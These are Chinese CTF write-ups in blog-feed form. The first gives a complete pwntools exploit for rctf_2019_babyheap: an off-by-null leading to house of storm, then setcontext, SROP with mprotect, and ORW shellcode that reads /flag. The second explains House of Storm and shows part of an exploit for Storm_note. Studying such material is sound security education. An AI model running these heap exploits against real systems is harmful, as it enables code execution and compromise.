  return __readfsqword(0x28u) ^ v4;
}
</code></pre>
<h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3><p>存在off-by-null漏洞</p>
<pre><code>unsigned __int64 edit()
{
  unsigned int v1; // [rsp+0h] [rbp-10h]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )
  {
    printf("Content: ");
    *(*(ptrs + 2 * v1) + read_n(*(ptrs + 2 * v1), *(ptrs + 4 * v1 + 2))) = 0; //off-by-one
    puts("Edit success :)");
  }
  else
  {
    puts("Invalid index :(");
  }
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><pre><code>unsigned __int64 delete()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )
  {
    free(*(ptrs + 2 * v1));
    *(ptrs + 2 * v1) = 0LL;
    *(ptrs + 4 * v1 + 2) = 0;
    puts("Delete success :)");
  }
  else
  {
    puts("Invalid index :(");
  }
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<h3 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h3><pre><code>unsigned __int64 show()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )
    puts(*(ptrs + 2 * v1));
  else
    puts("Invalid index :(");
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>看了大佬的博客<a href="https://blog.csdn.net/weixin_44145820/article/details/105709145">rctf_2019_babyheap</a>，这里对其进行详细的解析。<br class='item-img' data-src='https://img-blog.csdnimg.cn/c2a49de2eb0a492d882fd2f865cb3fd9.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/c2a49de2eb0a492d882fd2f865cb3fd9.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>程序禁用了fastbin，且能申请最大为0x1000大小的chuck，可以使用house of storm，修改free_hook的地址为shellcode，执行shellcode，这里我们需要用orw来写shellcode，并且在这之前需要用mprotect函数修改free_hook段为可读可写可执行权限。</p>
<h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><p>先把前面的写好</p>
<pre><code># coding=utf-8
from pwn import *
#sh = remote("node4.buuoj.cn", 29278)
sh = process('./rctf_2019_babyheap')
context(log_level = 'debug', arch = 'amd64', os = 'linux')
elf = ELF("./rctf_2019_babyheap")
libc = ELF('../../libc-2.23.so--64')
def dbg():
        gdb.attach(sh)
        pause()

#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims   :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg=lambda address,data:log.success('%s: '%(address)+hex(data))

 
def add(size):
    ru("Choice: \n")
    sl('1')
    ru("Size: ")
    sl(str(size))

def free(index):
    ru("Choice: \n")
    sl('3')
    ru("Index: ")
    sl(str(index))

def show(index):
    ru("Choice: \n")
    sl('4')
    ru("Index: ")
    sl(str(index))

def edit(index, content):
    ru("Choice: \n")
    sl('2')
    ru("Index: ")
    sl(str(index))
    ru("Content: ")
    s(content)
</code></pre>
<h3 id="首先构造堆块重叠，泄露libc基地址"><a href="#首先构造堆块重叠，泄露libc基地址" class="headerlink" title="首先构造堆块重叠，泄露libc基地址"></a>首先构造堆块重叠，泄露libc基地址</h3><p>先申请四个chunk，申请的chunk真正大小分别为0x90,0x70,0x100,0x20,<br>chunk_3是为了free前三个chunk后防止堆块合并</p>
<pre><code>add(0x80)#0
add(0x68)#1
add(0xf0)#2
add(0x18)#3
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b273495bb0594e12a61988abd446ee94.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/b273495bb0594e12a61988abd446ee94.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>之后free chunk_0，此时因为禁用了fastbin，所以chunk_0直接进入了unsortedbin里，再利用off-by-null漏洞修改chunk_2的pre_size为0x100（chunk_0+chunk_1正好就是0x100），修改chunk_2的size为0x100，使他处于free状态。</p>
<pre><code>free(0)
payload = 'a'*0x60 + p64(0x100)
edit(1, payload)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b4ecbc1851fb4a11b72f4961b3cb4df3.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/b4ecbc1851fb4a11b72f4961b3cb4df3.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>free chunk_2后，触发堆块前向合并，chunk_2的pre_size为是0x100,chunk_0和chunk_1加起来是0x100，就是前三个chunk合并。unsortedbin里存放着原chunk_0的起始地址。</p>
<pre><code>free(2)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/62792e0e3da5422d95259220edb7fdb8.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/62792e0e3da5422d95259220edb7fdb8.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/dd94627bad054eb4b8269b4b8e123b05.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/dd94627bad054eb4b8269b4b8e123b05.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>此时chunk_1是没有被free的，然后我们再次申请0x80（原chunk_0大小）大小的chunk，此时原chunk_1的mem区域存放着main_arena+88，因为chunk_1并没有被free，所以我们直接调用show函数即可泄露libc基地址。</p>
<pre><code>add(0x80)#0
show(1)
malloc_hook = u64(ru('\x7f').ljust(8, '\x00')) - 0x58 - 0x10
libc.address = malloc_hook - libc.sym['__malloc_hook']
system = libc.sym['system']
free_hook = libc.sym['__free_hook']
set_context = libc.symbols['setcontext']
lg('libc_base',libc.address)

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/9ff831c9123540d58be264d17010621a.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/9ff831c9123540d58be264d17010621a.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/9869752c89264053a4f41e7c96e5278d.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/9869752c89264053a4f41e7c96e5278d.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h3 id="构造unsortbin-chunk-和largebin-chunk，进行-house-of-strom"><a href="#构造unsortbin-chunk-和largebin-chunk，进行-house-of-strom" class="headerlink" title="构造unsortbin chunk 和largebin chunk，进行 house of strom"></a>构造unsortbin chunk 和largebin chunk，进行 house of strom</h3><p>先申请0x160大小的chunk，将unsortbin中残余chunk清空，之后构造unsortbin chunk 和largebin chunk的调试过程请参考我另一篇文章<a href="https://blog.csdn.net/tbsqigongzi/article/details/126185571?spm=1001.2014.3001.5502">House of storm</a><br>此时我们已以可以修改free_hook处的值了</p>
<pre><code>#---------------布置chunk-------------------------#
add(0x18)#4
add(0x508)#5
add(0x18)#6
add(0x18)#7
add(0x508)#8
add(0x18)#9
add(0x18)#10

#dbg()
#----------------准备 unsorted chunk-----------------------#	
edit(5, 'a'*0x4f0+p64(0x500))

#dbg()

free(5)
edit(4, 'a'*0x18)

#dbg()

add(0x18)#5
add(0x4d8)#11
free(5)
free(6)

#dbg()

add(0x30)#5
add(0x4e8)#6

#dbg()

#-------------------准备 large chunk-----------------------------------#
edit(8, 'a'*0x4f0+p64(0x500))
free(8)
edit(7, 'a'*0x18)
add(0x18)#8
add(0x4d8)#12
free(8)
free(9)
add(0x40)#8
#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#

#dbg()

free(6)

#dbg()

add(0x4e8)#6

#dbg()

free(6)

#dbg()

#pause()
#--------------修改他们的满足条件进行 house of strom------------------------------#
storage = free_hook
fake_chunk = storage - 0x20
payload = '\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
edit(11, payload)

#dbg()

payload = '\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)
edit(12, payload)

#dbg()

add(0x48)#6
</code></pre>
<h3 id="mprotect-shellcode"><a href="#mprotect-shellcode" class="headerlink" title="mprotect+shellcode"></a>mprotect+shellcode</h3><p>修改free_hook为set_context+53，free_hook+0x18，free_hook+0x18，shellcode1,<br>setcontext函数负责对各个寄存器进行赋值，甚至可以控制rip，对寄存器进行赋值主要从+53开始，shellcode1即为read(0, new_addr,0x1000)，new_addr即为（free_hook &amp;0xFFFFFFFFFFFFF000）free_hook所在内存页的起始位置。我们将对这里赋予可读可写可执行权限。</p>
<pre><code>new_addr =  free_hook &amp;0xFFFFFFFFFFFFF000
shellcode1 = '''
xor rdi,rdi
mov rsi,%d
mov edx,0x1000

mov eax,0
syscall

jmp rsi
''' % new_addr
edit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/61bf594dbee4483f94beaf7afa376c9d.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/61bf594dbee4483f94beaf7afa376c9d.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/59681f7ab0f64f57a185cacaffcb4ca2.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/59681f7ab0f64f57a185cacaffcb4ca2.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/6bbe06a1c4ab4168a5bcf210118afc78.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/6bbe06a1c4ab4168a5bcf210118afc78.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>我们利用pwntools里的SigreturnFrame()执行mprotect(new_addr,0x1000,7)，并将rsp跳转到<br>free_hook+0x10处，即0x00007f05935487c0，之后执行0x00007f05935487c0地址处的代码，即我们刚才写入的shellcode1，执行read(0, new_addr,0x1000)，将我们构造的第二个shellcode写入0x00007f0593548000处 ，并将rip跳转到我们写的第二个shellcode处执行。</p>
<pre><code>frame = SigreturnFrame()
frame.rsp = free_hook+0x10
frame.rdi = new_addr
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc.sym['mprotect']
edit(12, str(frame))
free(12)
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/0211f5b1b2cb415b910461947216e62e.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/0211f5b1b2cb415b910461947216e62e.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/96861fc257104349a4a906803ad96103.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/96861fc257104349a4a906803ad96103.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p>利用orw构造shellcode，发送过去并执行，获得shell</p>
<pre><code>shellcode2 = '''
mov rax, 0x67616c662f ;// /flag
push rax

mov rdi, rsp ;// /flag
mov rsi, 0 ;// O_RDONLY
xor rdx, rdx ;
mov rax, 2 ;// SYS_open
syscall

mov rdi, rax ;// fd 
mov rsi,rsp  ;
mov rdx, 1024 ;// nbytes
mov rax,0 ;// SYS_read
syscall

mov rdi, 1 ;// fd 
mov rsi, rsp ;// buf
mov rdx, rax ;// count 
mov rax, 1 ;// SYS_write
syscall

mov rdi, 0 ;// error_code
mov rax, 60
syscall
'''
sl(asm(shellcode2))
itr()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/7f499b7e484a41cf8d8efde596b692d9.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/7f499b7e484a41cf8d8efde596b692d9.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code># coding=utf-8
from pwn import *
#sh = remote("node4.buuoj.cn", 29278)
sh = process('./rctf_2019_babyheap')
context(log_level = 'debug', arch = 'amd64', os = 'linux')
elf = ELF("./rctf_2019_babyheap")
libc = ELF('../../libc-2.23.so--64')
def dbg():
        gdb.attach(sh)
        pause()

#命令简写化
s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims   :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg=lambda address,data:log.success('%s: '%(address)+hex(data))

 
def add(size):
    ru("Choice: \n")
    sl('1')
    ru("Size: ")
    sl(str(size))

def free(index):
    ru("Choice: \n")
    sl('3')
    ru("Index: ")
    sl(str(index))

def show(index):
    ru("Choice: \n")
    sl('4')
    ru("Index: ")
    sl(str(index))

def edit(index, content):
    ru("Choice: \n")
    sl('2')
    ru("Index: ")
    sl(str(index))
    ru("Content: ")
    s(content)

def pwn():
 
    add(0x80)#0
    add(0x68)#1
    add(0xf0)#2
    add(0x18)#3
    
    #dbg()

    free(0)
    payload = 'a'*0x60 + p64(0x100)
    edit(1, payload)
    
    #dbg()
    
    free(2)

    #dbg()

    add(0x80)#0
    show(1)
    malloc_hook = u64(ru('\x7f').ljust(8, '\x00')) - 0x58 - 0x10
    libc.address = malloc_hook - libc.sym['__malloc_hook']
    system = libc.sym['system']
    free_hook = libc.sym['__free_hook']
    set_context = libc.symbols['setcontext']
    lg('libc_base',libc.address)
    
    #dbg()
    
    add(0x160)#2

    #dbg()
    #---------------布置chunk-------------------------#
    add(0x18)#4
    add(0x508)#5
    add(0x18)#6
    add(0x18)#7
    add(0x508)#8
    add(0x18)#9
    add(0x18)#10

    #dbg()
    #----------------准备 unsorted chunk-----------------------#	
    edit(5, 'a'*0x4f0+p64(0x500))

    #dbg()

    free(5)
    edit(4, 'a'*0x18)
    
    #dbg()

    add(0x18)#5
    add(0x4d8)#11
    free(5)
    free(6)
    
    #dbg()
    
    add(0x30)#5
    add(0x4e8)#6
    
    #dbg()
    
    #-------------------准备 large chunk-----------------------------------#
    edit(8, 'a'*0x4f0+p64(0x500))
    free(8)
    edit(7, 'a'*0x18)
    add(0x18)#8
    add(0x4d8)#12
    free(8)
    free(9)
    add(0x40)#8
    #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#
    
    #dbg()
    
    free(6)
    
    #dbg()
    
    add(0x4e8)#6
    
    #dbg()
    
    free(6)

    #dbg()

    #pause()
    #--------------修改他们的满足条件进行 house of strom------------------------------#
    storage = free_hook
    fake_chunk = storage - 0x20
    payload = '\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)
    edit(11, payload)

    #dbg()

    payload = '\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)
    edit(12, payload)

    #dbg()

    add(0x48)#6
    
    #dbg()

    new_addr =  free_hook &amp;0xFFFFFFFFFFFFF000
    shellcode1 = '''
    xor rdi,rdi
    mov rsi,%d
    mov edx,0x1000

    mov eax,0
    syscall

    jmp rsi
    ''' % new_addr
    edit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))

    #dbg()

    frame = SigreturnFrame()
    frame.rsp = free_hook+0x10
    frame.rdi = new_addr
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.rip = libc.sym['mprotect']
    edit(12, str(frame))
    free(12)
    #dbg() 

    shellcode2 = '''
    mov rax, 0x67616c662f ;// /flag
    push rax

    mov rdi, rsp ;// /flag
    mov rsi, 0 ;// O_RDONLY
    xor rdx, rdx ;
    mov rax, 2 ;// SYS_open
    syscall

    mov rdi, rax ;// fd 
    mov rsi,rsp  ;
    mov rdx, 1024 ;// nbytes
    mov rax,0 ;// SYS_read
    syscall

    mov rdi, 1 ;// fd 
    mov rsi, rsp ;// buf
    mov rdx, rax ;// count 
    mov rax, 1 ;// SYS_write
    syscall

    mov rdi, 0 ;// error_code
    mov rax, 60
    syscall
    '''
    sl(asm(shellcode2))
    

    dbg()
    itr()
 
 
pwn()
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>House Of Storm</title>
    <url>/2023/04/10/House%20of%20Storm/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="House-of-storm"><a href="#House-of-storm" class="headerlink" title="House of storm"></a>House of storm</h1><p>结合了unsorted_bin_attack和Largebin_attack的攻击技术,实现任意地址分配chunk，任意地址写。</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a>利用条件:</h2><pre><code>1.需要攻击者在largebin和unsorted_bin中分别布置一个chunk ，
  这两个chunk需要在归位之后处于同一个largebin的index中，
  且unsortedbin中的chunk要比largebin中的大
2.需要unsorted_bin中的bk指针可控
3.需要largebin中的bk指针和bk_nextsize指针可控
4.glibc版本小于2.30,因为2.30之后加入了检查
</code></pre>
<h3 id="largebin中size与index的对应关系"><a href="#largebin中size与index的对应关系" class="headerlink" title="largebin中size与index的对应关系"></a>largebin中size与index的对应关系</h3><pre><code>size    index
[0x400 , 0x440)   	 64
[0x440 , 0x480)    	 65
[0x480 , 0x4C0)   	 66
[0x4C0 , 0x500)   	 67
[0x500 , 0x540)   	 68
等差 0x40    …
[0xC00 , 0xC40)    	 96
[0xC40 , 0xE00)      97
[0xE00 , 0x1000)     98
[0x1000 , 0x1200)    99
[0x1200 , 0x1400)    100
[0x1400 , 0x1600)    101
等差 0x200    …
[0x2800 , 0x2A00)    111
[0x2A00 , 0x3000)    112
[0x3000 , 0x4000)    113
[0x4000 , 0x5000)    114
等差 0x1000    …
[0x9000 , 0xA000)      119
[0xA000 , 0x10000)     120
[0x10000 , 0x18000)    121
[0x18000 , 0x20000)    122
[0x20000 , 0x28000)    123
[0x28000 , 0x40000)    124
[0x40000 , 0x80000)    125
[0x80000 , …. )        126
</code></pre>
<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><pre><code>1.将unsorted_bin中的bk指针改为fake_chunk
2.largebin中的bk指针改为fake_chunk+8，bk_nextsize指针改为fake_chunk-0x18-5	,
（target为要修改的目标地址，fake_chunk为target-0x20）
 来满足victim-&gt;bk_nextsize-&gt;fd_nextsize = victim（即fake_chunk-0x18-5=victim）
3.再次malloc获得target地址处的chunk，可修改target地址处的值
</code></pre>
<p>House_of_storm的精髓所在——伪造size，如果在程序开启PIE的情况下，堆地址的开头通常是0x55或者0x56开头，且我们的堆地址永远都是6个字节，且如果是小端存储的话，减去五个字节，剩下的就是0x55了。如果提前5个字节开始写堆地址，那么伪造在size字段上面的就正好是0x55。如果后续再申请堆块时，通过对齐使0x55对齐之后和攻击者申请的size正好相同的话，就可以在任意地址上申请出来一个chunk，也就可以达成后续的任意地址写操作。<br>之所以是0x56是因为__int_malloc在拿到chunk后返回到__libc_malloc，__libc_malloc会对chunk的进行检查，这里如果有错的话会直接crash，必须满足以下条件之一即可：</p>
<pre><code>1. victim 为 0
2. IS_MMAPPED 为 1
3. NON_MAIN_ARENA 为 0
</code></pre>
<p>0x56（二进制数为0101 0110）满足条件<br>0x55（二进制数为0101 0101）不满足条件<br>但是由于程序有随机化，多运行几次总能有一次成功的。</p>
<pre><code>unsorted_bin-&gt;fd = 0
unsorted_bin-&gt;bk = fake_chunk

large_bin-&gt;fd = 0
large_bin-&gt;bk = fake_chunk+8
large_bin-&gt;fd_nextsize = 0
large_bin-&gt;bk_nextsize = fake_chunk - 0x18 -5
</code></pre>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2019-西湖论剑-Storm-note"><a href="#2019-西湖论剑-Storm-note" class="headerlink" title="2019 西湖论剑 Storm_note"></a>2019 西湖论剑 Storm_note<img src="https://img-blog.csdnimg.cn/7c6fe5147ccf463e93da3ca872c3ad58.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></h3><p>保护全开，实现四个功能，增改删退，ida查看伪代码<br>init_proc()函数，mallopt()函数，设置fastbin 范围最大为0，禁用了fastbin，<br>之后用mmap在 0xABCD0100处分配0x30大小的空间，填充上了随机数</p>
<h4 id="init-proc-函数"><a href="#init-proc-函数" class="headerlink" title="init_proc()函数"></a>init_proc()函数</h4><pre><code> ssize_t init_proc()
{
  ssize_t result; // rax
  int fd; // [rsp+Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  if ( !mallopt(1, 0) )                         // mallopt(M_MXFAST,0)将global_max_fast设置为0,
                                                // 这个值的意思是最大为多大的chunk归fastbin管理,
                                                // 设置为0表示这个程序中不再存在fastbin。
                                                // 即本程序禁用了fastbin。
    exit(-1);
  if ( mmap(0xABCD0000LL, 0x1000uLL, 3, 34, -1, 0LL) != 0xABCD0000LL )
    exit(-1);
  fd = open("/dev/urandom", 0);
  if ( fd &lt; 0 )
    exit(-1);
  result = read(fd, 0xABCD0100LL, 0x30uLL);
  if ( result != 48 )
    exit(-1);
  return result;
}
</code></pre>
<h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><p>calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。</p>
<pre><code>unsigned __int64 alloc_note()
{
  int size; // [rsp+0h] [rbp-10h] BYREF
  int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  for ( i = 0; i &lt;= 15 &amp;&amp; note[i]; ++i )
    ;
  if ( i == 16 )
  {
    puts("full!");
  }
  else
  {
    puts("size ?");
    _isoc99_scanf("%d", &amp;size);
    if ( size &gt; 0 &amp;&amp; size &lt;= 0xFFFFF )
    {
      note[i] = calloc(size, 1uLL);             // calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。
                                                // 
      note_size[i] = size;
      puts("Done");
    }
    else
    {
      puts("Invalid size");
    }
  }
  return __readfsqword(0x28u) ^ v3;
}
</code></pre>
<h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><p>存在off-by-null</p>
<pre><code>unsigned __int64 edit_note()
{
  unsigned int size; // [rsp+0h] [rbp-10h] BYREF
  int v2; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Index ?");
  _isoc99_scanf("%d", &amp;size);
  if ( size &lt;= 0xF &amp;&amp; note[size] )
  {
    puts("Content: ");
    v2 = read(0, note[size], note_size[size]);
    *(note[size] + v2) = 0;                     // off-by-null
                                                // 
    puts("Done");
  }
  else
  {
    puts("Invalid index");
  }
  return __readfsqword(0x28u) ^ v3;
}
</code></pre>
<h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p>无uaf</p>
<pre><code>unsigned __int64 delete_note()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Index ?");
  _isoc99_scanf("%d", &amp;v1);
  if ( v1 &lt;= 0xF &amp;&amp; note[v1] )
  {
    free(note[v1]);
    note[v1] = 0LL;
    note_size[v1] = 0;
  }
  else
  {
    puts("Invalid index");
  }
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<h4 id="一个后门函数"><a href="#一个后门函数" class="headerlink" title="一个后门函数"></a>一个后门函数</h4><p>要想执行system(“/bin/sh”);，需要输入与程序一开始分配的随机数相同的数</p>
<pre><code>void __noreturn backdoor()
{
  char buf[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v1; // [rsp+38h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("If you can open the lock, I will let you in");
  read(0, buf, 0x30uLL);
  if ( !memcmp(buf, 0xABCD0100LL, 0x30uLL) )
    system("/bin/sh");
  exit(0);
}
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>1、利用off-by-null 漏洞构造堆风水，实现堆块重叠，从而控制堆块内容。<br>2、House of storm，将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack<br>3、控制largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写，将0xABCD0100处的0x30字节改为已知值，获得shell</p>
<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>先把前面的东西写好</p>
<pre><code># coding=utf-8
from pwn import *
#context(endian='little',os='linux',arch='amd64',log_level='debug')
sh = process('./Storm_note')

s       = lambda data               :sh.send(data)
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
r       = lambda num=4096           :sh.recv(num)
ru      = lambda delims		    :sh.recvuntil(delims)
itr     = lambda                    :sh.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
def dbg():
        gdb.attach(sh)
        pause()


def add(size):
  sla('Choice','1')
  sla('?',str(size))

def edit(index,text):
  sla('Choice','2')
  sla('?',str(index))
  sa('Content',text)

def free(index):
  sla('Choice','3')
  sla('?',str(index))
</code></pre>
<p>首先申请两组chunk，用来构造堆块重叠，并进入unsortedbin和largebin</p>
<pre><code>add(0x18)#0
add(0x508)#1
add(0x18)#2

add(0x18)#3
add(0x508)#4
add(0x18)#5

add(0x18)#6
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/321b4d41c3014c2b879d9f599177de23.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/321b4d41c3014c2b879d9f599177de23.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p>
<p>然后构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。</p>
<pre><code>edit(1,'a'*0x4f0+p64(0x500)) 
edit(4,'a'*0x4f0+p64(0x500)) 

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/e61a65c715fa4284ac55a3b9905d09f6.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/e61a65c715fa4284ac55a3b9905d09f6.png?ynotemdtimestamp=1663776442613" alt="img"><br>然后再free(1)，利用off-by-null编辑chunk_0，将chunk_1的size从0x510改为0x500，由于刚才构造的两个fake chunk，此时堆块已合并</p>
<pre><code>free(1)
edit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/9ec5985989204608aa56aafec155f7b5.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/9ec5985989204608aa56aafec155f7b5.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再申请两个chunk，使之恢复正常，之后free掉chunk_1和chunk_2，使之合并</p>
<pre><code>add(0x18)#1
add(0x4d8)#7  

free(1)
free(2)    

dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/4e4ed9a1288a49189cef06355829b08d.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/4e4ed9a1288a49189cef06355829b08d.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>再次申请两个特定大小的chunk即可实现chunk7可以控制原unsortedbin chunk 0x4f1的bk指针，即我们可以用chunk_7来控制chunk_2(unsortedbin chunk),为便于理解我们可查看一下note这个存放全局chunk mem指针的数组</p>
<pre><code>add(0x30)#1 此时chunk1可以控制原unsortedbin chunk  0x4f1(chunk_2)的bk指针
add(0x4e0)#2
dbg()
</code></pre>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/36e2df6f2de145d9927fe1d89316d64e.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/36e2df6f2de145d9927fe1d89316d64e.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针</p>
<pre><code>free(4)
edit(3,'a'*0x18)#off by null
add(0x18)#4
